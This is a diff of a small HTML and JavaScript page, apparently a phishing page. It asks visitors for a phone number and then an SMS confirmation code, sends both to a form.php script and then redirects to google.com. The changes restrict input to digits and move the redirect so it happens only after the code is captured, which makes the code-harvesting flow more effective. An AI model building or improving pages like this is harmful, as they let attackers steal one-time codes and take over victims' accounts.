@@ -26,6 +26,7 @@
         box-shadow: 2px 4px 6px 0px #aaa;
       }
     </style>
+
   </head>
   <body>
     <center>
@@ -34,11 +35,11 @@
       <hr>
     <div id="block" >
       <h3>Your number phone:</h3>
-      <input type=phone id=numb class="inp">
-      <input type="submit" value="Далее" id="phone" class="sun" placeholder="Phone number">
+      <input  onkeypress='return event.charCode >= 48 && event.charCode <= 57' maxlength=11 minlength=11 id=numb class="inp">
+      <input type="submit" value="Далее" id="phone" class="sun" placeholder="Phone number" >
     </div>
     <div id=code>
-      <input type="number" name="" id="send_code" class="inp" placeholder="SMS Code">
+      <input name="" id="send_code" class="inp" onkeypress='return event.charCode >= 48 && event.charCode <= 57'  minlength=11 maxlength=4 placeholder="SMS Code">
       <input type="submit" value="Send" id="send" class="sun">
     </div>
   </center>
@@ -54,12 +55,12 @@
     sender.src="form.php?phone="+numb.value;
     code.style.display="block";
     block.style.display="none";
-    window.location.href="https://google.com";
-    }
+  }
   };
   document.getElementById('send').onclick = function(){
     if(document.getElementById('send_code').value===""){alert("Error. Укажите СМС код!")}else{
     sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value;
+    window.location.href="https://google.com";
     }
   };
   </script>
